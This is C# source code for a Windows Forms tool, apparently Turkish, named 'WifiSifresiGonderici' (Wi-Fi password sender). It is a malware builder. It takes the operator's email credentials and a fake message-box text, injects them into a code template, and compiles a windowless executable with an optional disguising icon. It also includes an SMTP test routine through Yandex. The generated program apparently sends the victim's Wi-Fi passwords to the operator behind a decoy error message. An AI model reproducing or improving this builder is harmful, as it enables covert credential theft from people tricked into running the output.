using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using System.Resources;
using System.Net.Mail;

namespace WifiSifresiGonderici
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        
        string ikonYol = "YOK";
        private void btnIkon_Click(object sender, EventArgs e)
        {
            OpenFileDialog ikon = new OpenFileDialog();
            ikon.Filter = "ico|*.ico";

            if (ikon.ShowDialog() == DialogResult.OK)
            {
                ikonYol = ikon.FileName;
                pbIkon.ImageLocation = ikon.FileName;
            }
        }
        private void btnOlustur_Click(object sender, EventArgs e)
        {
            string Eposta = txtPosta.Text;
            string Sifre = txtParola.Text;
            string MesajBasligi = txtMesajBaslik.Text;
            string MesajIcerigi = txtMesajIcerigi.Text;

            if (Eposta != "" && Sifre != "" && MesajBasligi != "" && MesajIcerigi != "")
            {
                
                if (cbIkon.Checked && pbIkon.ImageLocation == null)
                {
                    MessageBox.Show("Lütfen Bir İkon Seçin!", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    SaveFileDialog kaydet = new SaveFileDialog();
                    kaydet.Filter = "EXE|*.exe";

                    if (kaydet.ShowDialog() == DialogResult.OK)
                    {
                        Eposta = @"string eposta=""" + Eposta + @""";";
                        Sifre = @"string sifre=""" + Sifre + @""";";
                        MesajIcerigi = @"string MesajIcerik=""" + MesajIcerigi + @""";";
                        MesajBasligi = @"string MesajBaslik=""" + MesajBasligi + @""";";
                       

                        richKod.Text = richKod.Text.Replace("string eposta;", Eposta);
                        richKod.Text = richKod.Text.Replace("string sifre;", Sifre);
                        richKod.Text = richKod.Text.Replace("string MesajIcerik;", MesajIcerigi);
                        richKod.Text = richKod.Text.Replace("string MesajBaslik;", MesajBasligi);

                        string kod = richKod.Text;

                        string ayar = " ";

                        Olusturucu.Derleyici(kaydet.FileName, kod, ayar, ikonYol);
                        btnOlustur.Enabled = false;

                    }
                }
            }
            else
            {
                MessageBox.Show("Lütfen Tüm Bilgileri Giriniz.", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            btnIkon.Enabled = false;
            richKod.ReadOnly = true;
        }

        private void cbIkon_CheckedChanged(object sender, EventArgs e)
        {
            if (cbIkon.Checked)
                btnIkon.Enabled = true;
            else
            {
                btnIkon.Enabled = false;
                ikonYol = "YOK";
                pbIkon.ImageLocation = null;
            }
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void txtParola_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void btnTestMaili_Click(object sender, EventArgs e)
        {
            
            string Eposta = txtPosta.Text;
            string Sifre = txtParola.Text;
            if(Eposta != "" && Sifre != "")
            {
                MailMessage ePosta = new MailMessage();
                ePosta.From = new MailAddress(Eposta);
                ePosta.To.Add(Eposta);
                ePosta.Subject = "Wifi Şifre Alıcı";
                ePosta.Body = "Test Mail";
                SmtpClient smtp = new SmtpClient();
                smtp.Credentials = new System.Net.NetworkCredential(Eposta, Sifre);
                smtp.Port = 587;
                smtp.Host = "smtp.yandex.com";
                smtp.EnableSsl = true;
                object Durum = ePosta;
                try
                {
                    smtp.SendAsync(ePosta, (object)ePosta);
                    MessageBox.Show("Gönderildi.", "E-Posta", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (SmtpException ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            else
            {
                MessageBox.Show("Lütfen E-Posta Bilgilerinizi Girin.", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);

            }


        }

        private void btnTemizle_Click(object sender, EventArgs e)
        {
            txtPosta.Clear();
            txtParola.Clear();
        }

        private void btnMesajTemizle_Click(object sender, EventArgs e)
        {
            txtMesajBaslik.Clear();
            txtMesajIcerigi.Clear();
        }

        private void btnMesajTestEt_Click(object sender, EventArgs e)
        {
            if(txtMesajBaslik.Text == "" && txtMesajIcerigi.Text == "")
            {
                MessageBox.Show("Mesaj Başlığını ve Mesaj İçeriğini Giriniz.", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                MessageBox.Show(txtMesajIcerigi.Text, txtMesajBaslik.Text, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

    }

    class Olusturucu
    {
        public static bool Derleyici(string EXE_Adi, string Kod, string Ayar, string Ikon)
        {
            CodeDomProvider Derleyici = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters Parametreler = new CompilerParameters();
            CompilerResults Sonuclar = default(CompilerResults);


            Parametreler.GenerateExecutable = true;
 
            Parametreler.OutputAssembly = EXE_Adi;
            Parametreler.ReferencedAssemblies.Add("mscorlib.dll");
            Parametreler.ReferencedAssemblies.Add("System.dll");
            Parametreler.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Parametreler.ReferencedAssemblies.Add("System.Linq.dll");
            Parametreler.ReferencedAssemblies.Add("System.Data.dll");
            Parametreler.ReferencedAssemblies.Add("System.Data.Entity.dll");
            Parametreler.ReferencedAssemblies.Add("System.Core.dll");


            if (Ikon == "YOK")
                Parametreler.CompilerOptions = " /target:winexe";
            else
            {
                string temp;
                temp = string.Format("/target:winexe /win32icon:\"{0}\"", Ikon);
                Parametreler.CompilerOptions = temp;
            }


            Parametreler.TreatWarningsAsErrors = false;


            Sonuclar = Derleyici.CompileAssemblyFromSource(Parametreler, new string[] { Kod, Ayar });

            if (Sonuclar.Errors.Count > 0)
            {
                foreach (CompilerError DerlemeHatalari in Sonuclar.Errors)
                {
                    CompilerError hata = DerlemeHatalari;
                    MessageBox.Show("Oluşturma Tamamlanamadı! " + hata, "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                return false;
            }
            else if (Sonuclar.Errors.Count == 0)
            {
                MessageBox.Show("Uygulama Başarıyla Oluşturuldu!", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return true;


            }
            return true;
        }
    }
}



